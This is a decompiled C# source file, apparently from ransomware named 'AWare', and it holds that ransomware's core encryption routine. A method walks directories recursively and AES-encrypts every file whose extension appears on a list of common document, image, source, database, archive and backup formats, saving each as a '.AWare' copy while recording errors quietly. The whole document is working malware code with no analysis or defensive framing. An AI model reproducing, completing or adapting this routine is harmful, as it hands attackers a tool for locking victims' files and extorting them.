using System;
using System.IO;
using System.Linq;
using AWare.Services;

namespace AWare.Extensions
{
	// Token: 0x02000009 RID: 9
	internal static class StringExtensions
	{
		// Token: 0x06000021 RID: 33 RVA: 0x00002900 File Offset: 0x00000B00
		internal static void EncryptDirectories(this string Paths, AesServices _aesServices, string SecretKey)
		{
			try
			{
				string[] files = Directory.GetFiles(Paths);
				string[] directories = Directory.GetDirectories(Paths);
				foreach (string text in files)
				{
					FileInfo fileInfo = new FileInfo(text);
					bool flag = Path.GetExtension(text).Contains("AWare");
					if (flag)
					{
						Program.ProtectedFiles.Add(fileInfo.FullName);
					}
					else
					{
						bool flag2 = !StringExtensions.Extensions.Contains(Path.GetExtension(text));
						if (!flag2)
						{
							Program.ProtectedFiles.Add(_aesServices.EncryptFile(text, fileInfo.FullName + ".AWare", SecretKey, 10));
						}
					}
				}
				foreach (string text2 in directories)
				{
					text2.EncryptDirectories(_aesServices, SecretKey);
				}
			}
			catch (Exception ex)
			{
				File.AppendAllText("Error_Log.AWare", ex.Message + Environment.NewLine);
			}
		}

		// Token: 0x04000012 RID: 18
		private static readonly string[] Extensions = new string[]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".png", ".csv",
			".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf",
			".java", ".c", ".cpp", ".py", ".jpg", ".jpge", ".go", ".rar", ".zip", ".config",
			".pdb", ".backup", ".cfg"
		};
	}
}
